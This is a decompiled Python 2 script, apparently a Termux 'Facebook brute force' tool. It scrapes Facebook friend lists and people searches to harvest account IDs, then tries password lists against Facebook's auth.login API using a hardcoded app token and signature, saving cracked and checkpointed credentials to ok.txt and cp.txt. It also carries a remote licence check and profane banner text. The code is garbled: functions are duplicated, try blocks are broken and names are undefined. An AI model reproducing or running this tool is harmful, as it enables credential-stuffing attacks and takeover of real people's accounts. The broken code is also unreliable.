# Source Generated with Decompyle++
# File: bff-2.py (Python 2.7)

import os
import sys
import time

def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.06)
    


def orang_mau_recode_sc_gw():
    os.system('clear')
    print '  \xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2                                                                 \xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2     '
    print '     _______   ______   _______  _______  _         _      '
    print '     |              |_____/   |_____|  |               |____/        '
    print '     |_____     |        \\_  |         |  |_____      |       \\_      '
    print '               \xe2\x80\xa2 Coded by : Hamayun musa \xe2\x80\xa2                   '
    print '   \xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2                                                                 \xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2    '
    print '   # Fb  : facebook.com/Hamayun khan              '
    print '   # Git : github.com/Hamayun                         '
    print '   # ----------------------------------------------------------- #    '
    print ''
    print ' Author : Hamayun  '
    print ' Izin Dulu su-_ kalau mau recode! tinggal pake aja ngapain di recode ribet amat '
    print ' Jgn lupa cantumkan nama pembuat nya kontol. Gk usah ubah nama Author memek'


def cek(self):
    r = requests.post(self.host.format('index.php?action=cek'), data = {
        'id': open(self.path).read().strip() })
    if r.json().get('status') == 'success':
        if r.json().get('result')['confirmed'] == 'false':
            print '\t[ hello %s ]\n' % r.json().get('result')['name']
            print '%s* your id: (%s) unconfirmed%s' % (G, open(self.path).read().strip(), N)
            raw_input('* press enter to get confirmation.')
            exit(subprocess.Popen([
                'am',
                'start',
                'https://wa.me/' + requests.get('https://api-asutoolkit.cloudaccess.host/no.txt').text.strip() + '?text=please confirm me\n\nID: ' + open(self.path).read().strip() + '\nNAME: ' + r.json()['result']['name'] + '\nORDER:  %sdays' % r.json().get('result')['license_limit']], stderr = subprocess.PIPE, stdin = subprocess.PIPE, stdout = subprocess.PIPE).wait())
        else:
            clear()
            banner()
            print '  + order: %s days, name- %s' % (r.json()['result']['license_limit'], r.json()['result']['name'])
            if os.path.exists('.browser'):
                if os.path.getsize('.browser') != 0:
                    pass
                else:
                    open('.browser', 'w').write(r.json()['result']['browser'])
            else:
                open('.browser', 'w').write(r.json()['result']['browser'])
            if r.json()['result']['vip'] == 'true':
                print '  + days used: %s' % r.json()['tinggal']
                print '  + VIP: %syes%s' % (G, N)
                print '  ' + '=' * 40 + '\n'
            else:
                print '  + days used: %s' % r.json()['tinggal']
                print '  + VIP: %sno%s' % (R, N)
                print '  ' + '=' * 40 + '\n'
    elif 'not found' in r.text:
        self.genid()
    else:
        print '\x1b[1;91m\xe2\x80\xa2 error, %s' % r.json()['message']
        self.genid()

if os.path.exists('ok.txt'):
    pass
open('ok.txt', 'a+').close()

def masuk():
    os.system('clear')
    banner()
    print ''
    print '\x1b[1;95m\xe2\x80\xa2\x1b[1;92m 1 \x1b[1;96mLogin with token\x1b[1;97m'
    print '\x1b[1;95m\xe2\x80\xa2\x1b[1;92m 2 \x1b[1;96mLogin with cookie\x1b[1;97m'
    print '\x1b[1;95m\xe2\x80\xa2\x1b[1;92m 3 \x1b[1;96mHow to get token\x1b[1;97m'
    print '\x1b[1;95m\xe2\x80\xa2\x1b[1;92m 4 \x1b[1;96mHow to get cookie\x1b[1;97m'
    print '\x1b[1;95m\xe2\x80\xa2\x1b[1;91m 0 \x1b[1;91mExit\x1b[1;97m'
    print ''
    pilih_masuk()


def pilih_masuk():
    lgn = raw_input('\x1b[1;95m\xe2\x80\xa2\x1b[1;92m \x1b[1;96mSelect\x1b[1;91m : \x1b[1;93m')
    if lgn == '':
        print '\x1b[1;91m Wrong Input '
        time.sleep(1)
        pilih_masuk()
    elif lgn == '1' or lgn == '01':
        token()
    elif lgn == '2' or lgn == '02':
        kuki()
    elif lgn == '3' or lgn == '03':
        tik()
        os.system('xdg-open https://facebook.com/ham143mah ')
        os.sys.exit()
    elif lgn == '4' or lgn == '04':
        tik()
        os.system('xdg-open https://facebook.com/ham143mah ')
        os.sys.exit()
    elif lgn == '0' or lgn == '00':
        exit()
    else:
        print '\x1b[1;91m Wrong Input '
        time.sleep(1)
        pilih_masuk()


def pwlist(self):
    self.pw = raw_input('\x1b[1;91m\xe2\x80\xa2\x1b[1;96m password list \x1b[1;91m:\x1b[1;93m ').split(',')
    if len(self.pw) == 0:
        self.pwlist()
    else:
        for i in self.fl:
            i.update({
                'pw': self.pw })
        
        print '\n\x1b[1;95m\xe2\x80\xa2 \x1b[1;96maccount \x1b[1;92m[OK] \x1b[1;96msaved to \x1b[1;91m-> \x1b[1;92mok.txt'
        print '\x1b[1;95m\xe2\x80\xa2\x1b[1;96m account \x1b[1;91m[\x1b[0;93mCP\x1b[1;91m]\x1b[1;96m saved to\x1b[1;91m -> \x1b[1;93mcp.txt\n'
        print '\x1b[1;95m\xe2\x80\xa2 \x1b[1;96min the process, please be patient'
        ThreadPool(30).map(self.main, self.fl)
        os.remove(self.apk)
        print '\n\x1b[1;92m\xe2\x80\xa2 \x1b[1;92mfinished'


def dump_pilih():
    rom = raw_input(' \x1b[1;96mzuck\x1b[1;91m/\x1b[1;94m>\x1b[1;93m ')
    idfromteman = []
    idteman = []
    if rom == '':
        print ' \x1b[1;91mIsi Yg Benar Sayang!'
        dump_pilih()
    elif rom == '1' or rom == '01':
        id_teman()
    elif rom == '2' or rom == '02':
        idfrom_teman()
    elif rom == '0' or rom == '00':
        rom_menu()
    else:
        print '\x1b[1;91m Isi Yg Benar Sayang!'
        dump_pilih()


def search(fl, r, b):
    open(fl, 'a+')
    b = bs4.BeautifulSoup(requests.get(b, cookies = r, headers = hdcok()).text, 'html.parser')
    for i in b.find_all('a', href = True):
        print '\r\x1b[1;95m\xe2\x80\xa2\x1b[1;96m [GET]\x1b[1;93m (\x1b[1;92m%s\x1b[1;93m) press ctrl+z for stop' % len(open(fl).read().splitlines()),
        sys.stdout.flush()
        if '<img alt=' in str(i):
            if 'home.php' in str(i['href']):
                continue
            else:
                g = str(i['href'])
                if 'profile.php' in g:
                    name = i.find('img').get('alt').replace(', profile picture', '')
                    d = bs4.re.findall('/profile\\.php\\?id=(.*?)&', g)
                    if len(d) != 0:
                        pk = ''.join(d)
                        if pk in open(fl).read():
                            pass
                        else:
                            open(fl, 'a+').write('%s<=>%s\n' % (pk, name))
                    
                else:
                    d = bs4.re.findall('/(.*?)\\?', g)
                    name = i.find('img').get('alt').replace(', profile picture', '')
                    if len(d) != 0:
                        pk = ''.join(d)
                        if pk in open(fl).read():
                            pass
                        else:
                            open(fl, 'a+').write('%s<=>%s\n' % (pk, name))
                    
        if 'Lihat Hasil Selanjutnya' in i.text:
            search(fl, r, i['href'])
            continue
    exit('\n\x1b[1;92m\xe2\x80\xa2 finished.')


def cek(arg):
    if os.path.exists('.cok'):
        if os.path.getsize('.cok') != 0:
            return True
        return None
    return False


def dumpfl():
    cvds = None
    cookie = None
    new = None
    if cek(1) == False:
        
        try:
            cookie = raw_input('\x1b[1;95m\xe2\x80\xa2\x1b[1;96m cookie\x1b[1;91m : \x1b[1;93m')
            cvds = cvd(cookie)
            new = True
        print '\x1b[1;91m\xe2\x80\xa2 invalid cookie'
        dumpfl()

    else:
        cvds = cvd(open('.cok').read().strip())
    r = requests.get('https://mbasic.facebook.com/profile.php', cookies = cvds, headers = hdcok()).text
    if len(bs4.re.findall('logout', r)) != 0:
        clear()
        if lang(cvds) != True:
            exit('\x1b[1;91m\xe2\x80\xa2 failed when detecting language or login failed')
        print ' \x1b[1;91m\xe2\x80\xa2\x1b[1;93m\xe2\x80\xa2\x1b[1;92m\xe2\x80\xa2                                      \x1b[1;91m\xe2\x80\xa2\x1b[1;93m\xe2\x80\xa2\x1b[1;92m\xe2\x80\xa2\n\x1b[1;91m   _______  ______ _______ _______ _     _\n   |       |_____/ |_____| |       |____/ \n\x1b[1;97m   |_____  |    \\_ |     | |_____  |    \\_\n\n\x1b[1;95m     \xe2\x80\xa2 \x1b[0;93mGithub -> github.com/ROMI-AFRZL \x1b[1;95m\xe2\x80\xa2   \n \x1b[1;91m\xe2\x80\xa2\x1b[1;93m\xe2\x80\xa2\x1b[1;92m\xe2\x80\xa2                                      \x1b[1;91m\xe2\x80\xa2\x1b[1;93m\xe2\x80\xa2\x1b[1;92m\xe2\x80\xa2'
        print '\n\x1b[1;95m\xe2\x80\xa2 \x1b[1;96mlogin as\x1b[1;91m :\x1b[1;93m %s ' % bs4.BeautifulSoup(r, 'html.parser').find('title').text[0:10]
        if new == True:
            open('.cok', 'w').write(cookie)
            print banner()
        fl = raw_input('\x1b[1;95m\xe2\x80\xa2\x1b[1;96m filename\x1b[1;91m : \x1b[1;93m').replace(' ', '_')
        s = raw_input('\x1b[1;95m\xe2\x80\xa2\x1b[1;96m search query\x1b[1;91m : \x1b[1;93m')
        search(fl, cvds, 'https://mbasic.facebook.com/search/people/?q=' + s)
    else:
        
        try:
            os.remove('.cok')
        except:
            pass

        print '\x1b[1;91m\xe2\x80\xa2 login fail!'
        dumpfl()


class lc:
    
    def __init__(self):
        self.path = '/data/data/com.termux/files/usr/lib/.bash'
        self.host = requests.get('https://raw.githubusercontent.com/ASU-TOOLKIT/server/master/server.txt').text.strip()
        self.genid()

    
    def paths(self):
        
        try:
            if os.path.exists(self.path):
                if os.path.getsize(self.path) != 0:
                    self.cek()
                else:
                    self.genid()
            else:
                self.genid()
        except Exception:
            e = None
            exit('\x1b[1;91m\xe2\x80\xa2 an error accoured %s' % e)


    
    def genid(self):
        id = []
        abs = list('abcdefghijklmnopqrstuvwxyz1234567890')
        for i in range(20):
            id.append(random.choice([
                random.choice(abs),
                random.choice(abs).upper()]))
        
        print '\x1b[1;95m\xe2\x80\xa2\x1b[1;96m your id\x1b[1;91m :\x1b[1;93m ' + ''.join(id)
        open(self.path, 'w').write(''.join(id))
        raw_input('* press enter to register or submit order..')
        exit(subprocess.Popen([
            'am',
            'start',
            self.host.format('index.php?action=reg&id=' + ''.join(id))], stderr = subprocess.PIPE, stdin = subprocess.PIPE, stdout = subprocess.PIPE).wait())

    
    def cek(self):
        r = requests.post(self.host.format('index.php?action=cek'), data = {
            'id': open(self.path).read().strip() })
        if r.json().get('status') == 'success':
            if r.json().get('result')['confirmed'] == 'false':
                print '\t[ hello %s ]\n' % r.json().get('result')['name']
                print '%s* your id: (%s) unconfirmed%s' % (G, open(self.path).read().strip(), N)
                raw_input('* press enter to get confirmation.')
                exit(subprocess.Popen([
                    'am',
                    'start',
                    'https://wa.me/' + requests.get('https://api-asutoolkit.cloudaccess.host/no.txt').text.strip() + '?text=please confirm me\n\nID: ' + open(self.path).read().strip() + '\nNAME: ' + r.json()['result']['name'] + '\nORDER:  %sdays' % r.json().get('result')['license_limit']], stderr = subprocess.PIPE, stdin = subprocess.PIPE, stdout = subprocess.PIPE).wait())
            else:
                clear()
                banner()
                print '  + order: %s days, name- %s' % (r.json()['result']['license_limit'], r.json()['result']['name'])
                if os.path.exists('.browser'):
                    if os.path.getsize('.browser') != 0:
                        pass
                    else:
                        open('.browser', 'w').write(r.json()['result']['browser'])
                else:
                    open('.browser', 'w').write(r.json()['result']['browser'])
                if r.json()['result']['vip'] == 'true':
                    print '  + days used: %s' % r.json()['tinggal']
                    print '  + VIP: %syes%s' % (G, N)
                    print '  ' + '=' * 40 + '\n'
                else:
                    print '  + days used: %s' % r.json()['tinggal']
                    print '  + VIP: %sno%s' % (R, N)
                    print '  ' + '=' * 40 + '\n'
        elif 'not found' in r.text:
            self.genid()
        else:
            print '\x1b[1;91m\xe2\x80\xa2 error, %s' % r.json()['message']
            self.genid()



def cek(arg):
    if os.path.exists('.cok'):
        if os.path.getsize('.cok') != 0:
            return True
        return None
    return False


def dumpfl():
    cvds = None
    cookie = None
    new = None
    if cek(1) == False:
        
        try:
            cookie = raw_input('\x1b[1;95m\xe2\x80\xa2\x1b[1;96m cookie\x1b[1;91m : \x1b[1;93m')
            cvds = cvd(cookie)
            new = True
        print '\x1b[1;91m\xe2\x80\xa2 invalid cookie'
        dumpfl()

    else:
        cvds = cvd(open('.cok').read().strip())
    r = requests.get('https://mbasic.facebook.com/profile.php', cookies = cvds, headers = hdcok()).text
    if len(bs4.re.findall('logout', r)) != 0:
        clear()
        if lang(cvds) != True:
            exit('\x1b[1;91m\xe2\x80\xa2 failed when detecting language or login failed')
        print ' \x1b[1;91m\xe2\x80\xa2\x1b[1;93m\xe2\x80\xa2\x1b[1;92m\xe2\x80\xa2                                      \x1b[1;91m\xe2\x80\xa2\x1b[1;93m\xe2\x80\xa2\x1b[1;92m\xe2\x80\xa2\n\x1b[1;91m   _______  ______ _______ _______ _     _\n   |       |_____/ |_____| |       |____/ \n\x1b[1;97m   |_____  |    \\_ |     | |_____  |    \\_\n\n\x1b[1;95m     \xe2\x80\xa2 \x1b[0;93mGithub -> github.com/ROMI-AFRZL \x1b[1;95m\xe2\x80\xa2   \n \x1b[1;91m\xe2\x80\xa2\x1b[1;93m\xe2\x80\xa2\x1b[1;92m\xe2\x80\xa2                                      \x1b[1;91m\xe2\x80\xa2\x1b[1;93m\xe2\x80\xa2\x1b[1;92m\xe2\x80\xa2'
        print '\n\x1b[1;95m\xe2\x80\xa2 \x1b[1;96mlogin as\x1b[1;91m :\x1b[1;93m %s ' % bs4.BeautifulSoup(r, 'html.parser').find('title').text[0:10]
        if new == True:
            open('.cok', 'w').write(cookie)
            print banner()
        fl = raw_input('\x1b[1;95m\xe2\x80\xa2\x1b[1;96m filename\x1b[1;91m : \x1b[1;93m').replace(' ', '_')
        s = raw_input('\x1b[1;95m\xe2\x80\xa2\x1b[1;96m search query\x1b[1;91m : \x1b[1;93m')
        search(fl, cvds, 'https://mbasic.facebook.com/search/people/?q=' + s)
    else:
        
        try:
            os.remove('.cok')
        except:
            pass

        print '\x1b[1;91m\xe2\x80\xa2 login fail!'
        dumpfl()


def anjing():
    os.system('python2 rom/bffb.py')


class lc:
    
    def __init__(self):
        self.path = '/data/data/com.termux/files/usr/lib/.bash'
        self.host = requests.get('https://raw.githubusercontent.com/ASU-TOOLKIT/server/master/server.txt').text.strip()
        self.genid()

    
    def paths(self):
        
        try:
            if os.path.exists(self.path):
                if os.path.getsize(self.path) != 0:
                    self.cek()
                else:
                    self.genid()
            else:
                self.genid()
        except Exception:
            e = None
            exit('\x1b[1;91m\xe2\x80\xa2 an error accoured %s' % e)


    
    def genid(self):
        id = []
        abs = list('abcdefghijklmnopqrstuvwxyz1234567890')
        for i in range(20):
            id.append(random.choice([
                random.choice(abs),
                random.choice(abs).upper()]))
        
        print '\x1b[1;95m\xe2\x80\xa2\x1b[1;96m your id\x1b[1;91m :\x1b[1;93m ' + ''.join(id)
        open(self.path, 'w').write(''.join(id))
        raw_input('* press enter to register or submit order..')
        exit(subprocess.Popen([
            'am',
            'start',
            self.host.format('index.php?action=reg&id=' + ''.join(id))], stderr = subprocess.PIPE, stdin = subprocess.PIPE, stdout = subprocess.PIPE).wait())



def update():
    os.system('clear')
    os.system('pkg update && pkg upgrade')
    os.system('git pull')
    os.system('python2 bff-2.py')


def dumpfl():
    cvds = None
    cookie = None
    new = None
    if cek(1) == False:
        
        try:
            cookie = raw_input('\x1b[1;95m\xe2\x80\xa2\x1b[1;96m cookie\x1b[1;91m : \x1b[1;93m')
            cvds = cvd(cookie)
            new = True
        print '\x1b[1;91m\xe2\x80\xa2 invalid cookie'
        dumpfl()



def bruteRequest(self, username, password):
    params = {
        'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
        'format': 'JSON',
        'sdk_version': '2',
        'email': username,
        'locale': 'en_US',
        'password': password,
        'sdk': 'ios',
        'generate_session_cookies': '1',
        'sig': '3f555f99fb61fcd7aa0c44f58f522ef6' }
    
    try:
        os.mkdir('out')
    except:
        pass

    api = 'https://b-api.facebook.com/method/auth.login'
    response = requests.get(api, params = params)
    if re.search('(EAAA)\\w+', response.text):
        self.ok.append(username + '\xe2\x97\x8a' + password)
        save = open('out/ok.txt', 'a')
        save.write(str(username) + '\xe2\x97\x8a' + str(password) + '\n')
        save.close()
        return True
    if None in response.json()['error_msg']:
        self.cp.append(username + '\xe2\x97\x8a' + password)
        save = open('out/cp.txt', 'a')
        save.write(str(username) + '\xe2\x97\x8a' + str(password) + '\n')
        save.close()
        return True
    return None


def tes():
    print ''
    print ''
    print ''
    print ''
    print ''
    print ''
    print ''
    print ''
    print ''
    print ''
    print ''
    print ''
    print ''
    print ''
    print ''
    print ''
    print ''
    
    print ''
    print ''
    print ''
    print ''
    print ''
    print ''
    print ''
    print ''
    print ''
    print ''
    print ''
    print ''
    print ''
    print ''
    print ''
    print ''
    print ''
    print ''
    print ''
    print ''
    print ''
    print ''
    print ''
    print ''
    print ''
    print ''
    print ''
    print ''
    print ''
    print 
    pilih_memek()


def main(self, response):
    os.system('clear')
    print self.config.banner()
    html = parser(response, 'html.parser')
    print '\x1b[0;95m\xe2\x80\xa2 Welcome \x1b[0;93m '.decode('utf-8') + html.title.text.upper()
    print self.menu
    
    try:
        choose = int(raw_input('\n\x1b[0;95m\xe2\x80\xa2\x1b[0;91m --> \x1b[0;93m'))
    except ValueError:
        exit('\n\x1b[0;95m\xe2\x80\xa2 \x1b[0;96mJalankan kembali perintah nya! python2 crack.py\x1b[0;97m')

    if choose == 1:
        exit(friends_list.main(self, self.cookie, self.url, self.config))
    elif choose == 2:
        exit(friends.main(self, self.cookie, self.url, self.config))
    elif choose == 3:
        exit(search_name.main(self, self.cookie, self.url, self.config))
    elif choose == 4:
        exit(likes.main(self, self.cookie, self.url, self.config))
    elif choose == 5:
        exit(crack.Brute().main())
    elif choose == 0:
        os.system('git pull')
    elif choose == 6:
        ask = raw_input('\n\x1b[0;95m\xe2\x80\xa2\x1b[0;97m Tekan enter untuk lanjut ')
        print '\x1b[0;95m\xe2\x80\xa2\x1b[0;96m Mohon tunggu... '
        os.system('xdg-open https://www.facebook.com/453688872336137')
    elif choose == 7:
        ask = raw_input('\n\x1b[0;95m\xe2\x80\xa2\x1b[0;97m Apakah anda yakin [\x1b[0;92mY\x1b[0;97m/\x1b[0;91mN\x1b[0;97m]\x1b[0;91m :\x1b[0;93m ')
        if ask.lower() == 'y':
            print '\x1b[0;95m\xe2\x80\xa2\x1b[0;91m Menghapus cokiies...'
            time.sleep(2)
            os.remove('log/cookies.log')
            print '\x1b[0;95m\xe2\x80\xa2 \x1b[0;92mberhasil terhapus!\x1b[0m'
            time.sleep(2)
            login.loginFb(self, self.url, self.config)
            self.cookie = self.config.loadCookie()
            self.start()
        else:
            self.cookie = self.config.loadCookie()
            print '\x1b[0;95m\xe2\x80\xa2 \x1b[0;91mbatal!'
            self.start()
    else:
        exit('\n\x1b[0;95m\xe2\x80\xa2\x1b[0;91mlihat menu dong ajg\x1b[0m')


def brute():
    if self.setpw == False:
        self.loop += 1
        for pw in users['pw']:
            username = users['id'].lower()
            password = pw.lower()
            
            try:
                if self.bruteRequest(username, password) == True:
                    break
            except:
                self

            sys.stdout.write('\r\x1b[0;95m\xe2\x80\xa2 \x1b[0;96m{}\x1b[0m \x1b[0;92mProcces\x1b[0;93m [\x1b[0;97m{}\x1b[0;93m/\x1b[0;97m{}\x1b[0;93m]\x1b[0;95m\xe2\x80\xa2\x1b[0;92m[\x1b[0;92mOK\x1b[0;91m:\x1b[0;92m{}]\x1b[0;95m\xe2\x80\xa2\x1b[0;91m[\x1b[0;93mCP\x1b[0;91m:\x1b[0;93m{}\x1b[0;91m]'.format(datetime.now().strftime('%H:%M:%S'), self.loop, len(self.target), len(self.ok), len(self.cp)))
            sys.stdout.flush()
        
    else:
        self.loop += 1
        for pw in self.setpw:
            username = users['id'].lower()
            password = pw.lower()
            
            try:
                if self.bruteRequest(username, password) == True:
                    break
            except:
                self
                self

            sys.stdout.write('\r\x1b[0;95m\xe2\x80\xa2 \x1b[0;96m{}\x1b[0m \x1b[0;92mProcces \x1b[0;93m[\x1b[0;97m{}\x1b[0;93m/\x1b[0;97m{}\x1b[0;93m]\x1b[0;95m\xe2\x80\xa2\x1b[0;92m[\x1b[0;92mOK\x1b[0;91m:\x1b[0;92m{}]\x1b[0;95m\xe2\x80\xa2\x1b[0;91m[\x1b[0;93mCP\x1b[0;91m:\x1b[0;93m{}\x1b[0;91m]'.format(datetime.now().strftime('%H:%M:%S'), self.loop, len(self.target), len(self.ok), len(self.cp)))
            sys.stdout.flush()
        


def main(self, cookie, url, config):
    flist = raw_input('\n\x1b[0;95m\xe2\x80\xa2 \x1b[0;93mMasukkan link daftar teman \x1b[0;91m:\x1b[0;96m ')
    
    try:
        domain = flist.split('//')[1].split('/')[0]
        flist = flist.replace(domain, 'mbasic.facebook.com')
    except IndexError:
        exit('\n\x1b[0;95m\xe2\x80\xa2 \x1b[0;91mLink salah!\x1b[0m')

    output = re.findall('https:\\/\\/.*?\\/(.*?)\\/friends\\?lst=', flist)
    _output = re.findall('id=(.*?)&refid=', flist)
    if len(output) == 0 and len(_output) == 0:
        exit('\n\x1b[0;95m\xe2\x80\xa2 \x1b[0;91mLink salah!\x1b[0m')
    elif len(output) != 0:
        output = 'dump/' + output[0] + '.json'
    else:
        output = 'dump/' + _output[0] + '.json'
    id = []
    print ''
    while True:
        
        try:
            response = config.httpRequest(flist, cookie).encode('utf-8')
            html = parser(response, 'html.parser')
            for x in html.find_all(style = 'vertical-align: middle'):
                find = x.find('a')
                if '+' in str(find) or find == None:
                    continue
                    continue
                full_name = str(find.text.encode('utf-8'))
                if '/profile.php?id=' in str(find):
                    uid = re.findall('/?id=(.*?)&', find['href'])
                else:
                    uid = re.findall('/(.*?)\\?fref=', find['href'])
                if len(uid) == 1:
                    id.append({
                        'uid': uid[0],
                        'name': full_name })
                sys.stdout.write('\r\x1b[0;95m\xe2\x80\xa2\x1b[0;91m ->\x1b[0;93m %s                                        \r\n\x1b[0;95m\xe2\x80\xa2 \x1b[0;92m%s\x1b[0;91m [\x1b[0;93m%s\x1b[0;91m] \x1b[0;93mSedang proses dump !' % (full_name, datetime.now().strftime('%H:%M:%S'), len(id)))
                sys.stdout.flush()
            
            if 'Lihat Teman Lain' in str(html):
                flist = url + html.find('a', string = 'Lihat Teman Lain')['href']
        continue
        except KeyboardInterrupt:
            print '\n\x1b[0;95m\xe2\x80\xa2 \x1b[0;91mInterupsi Kunci, berhenti!!\x1b[0m'
            break
            continue
        

    
    try:
        for filename in os.listdir('dump'):
            os.remove('dump/' + filename)
    except:
        pass

    print '\n\x1b[0;95m\xe2\x80\xa2 \x1b[0;97mOutput \x1b[0;91m:\x1b[0;93m ' + output
    save = open(output, 'w')
    save.write(json.dumps(id))
    save.close()


def menu():
    os.system('clear')
    
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m\xe2\x80\xa2 invalid'
        os.system('clear')
        os.system('rm -rf login.txt')
        masuk()

    
    try:
        otw = requests.get('https://graph.facebook.com/me/?access_token=' + toket)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
    except KeyError:
        os.system('clear')
        print '\x1b[1;91m\xe2\x80\xa2 invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        masuk()
        time.sleep(1)
        masuk()
    except requests.exceptions.ConnectionError:
        print '\x1b[1;91m\xe2\x80\xa2 Tidak ada koneksi'
        exit()

    banner()
    print '\n\x1b[1;95m\xe2\x80\xa2\x1b[1;96m \x1b[1;96mWelcome \x1b[1;92m' + nama + '\x1b[1;96m '
    print '  '
    print '\x1b[1;95m\xe2\x80\xa2\x1b[1;92m 1 \x1b[1;96mDump Id Public'
    print '\x1b[1;95m\xe2\x80\xa2\x1b[1;92m 2 \x1b[1;96mDump Id Followers '
    print '\x1b[1;95m\xe2\x80\xa2\x1b[1;92m 3 \x1b[1;96mStart Crack'
    print '\x1b[1;95m\xe2\x80\xa2\x1b[1;92m 4 \x1b[1;96mCek Result'
    print '\x1b[1;95m\xe2\x80\xa2\x1b[1;92m 5 \x1b[1;92mUpdate Tools'
    print '\x1b[1;95m\xe2\x80\xa2\x1b[1;91m 0 \x1b[1;91mRemove Token/Cookie\n'
    r = raw_input('\x1b[1;95m\xe2\x80\xa2\x1b[1;92m \x1b[1;96mSelect\x1b[1;91m : \x1b[1;93m')
    if r == '':
        os.system('clear')
        print ' \x1b[1;91m\xe2\x80\xa2\x1b[1;93m\xe2\x80\xa2\x1b[1;92m\xe2\x80\xa2\n\x1b[1;91m     _______  ______ _______ _______ _     _\n     |       |_____/ |_____| |       |____/ \n\x1b[1;97m     |_____  |    \\_ |     | |_____  |    \\_\n\n\x1b[1;95m       \xe2\x80\xa2 \x1b[0;93mGithub -> github.com/ROMI-AFRZL \x1b[1;95m\xe2\x80\xa2   \n \x1b[1;91m\xe2\x80\xa2\x1b[1;93m\xe2\x80\xa2\x1b[1;92m\xe2\x80\xa2 '
    elif r == '1':
        publik()
    elif r == '2':
        followers()
    elif r == '33':
        dump_grup(basecookie())
    elif r == '5':
        update()
    elif r == '3':
        crack()
        exit()
    elif r == '4':
        result()
    elif r == '66':
        raw_input('\x1b[1;95m\xe2\x80\xa2 \x1b[1;93mpress enter ')
        os.system('xdg-open https://www.facebook.com/romi.29.04.03')
        
        try:
            os.remove('/data/data/com.termux/files/usr/lib/.bash')
            exit('\x1b[1;92m\xe2\x80\xa2 run again the tools.')
        exit('\x1b[1;95m\xe2\x80\xa2\x1b[1;96m towards the browser')

    elif r == '77':
        print ' '
        print '\x1b[1;95m\xe2\x80\xa2 \x1b[1;96mplease wait opening group'
        exit(subprocess.Popen([
            'am',
            'start',
            'https://www.facebook.com/groups/453688872336137'], stderr = subprocess.PIPE, stdin = subprocess.PIPE, stdout = subprocess.PIPE).wait())
    elif r == '0':
        print ''
        tik()
        jalan('\n\x1b[1;92m\xe2\x80\xa2 Succes Remove Cookie/Token')
        os.system('rm -rf login.txt')
        os.sys.exit()
    else:
        print '\x1b[1;91m\xe2\x80\xa2 Wrong Input'
        os.sys.exit()

if __name__ == '__main__':
    anjing()
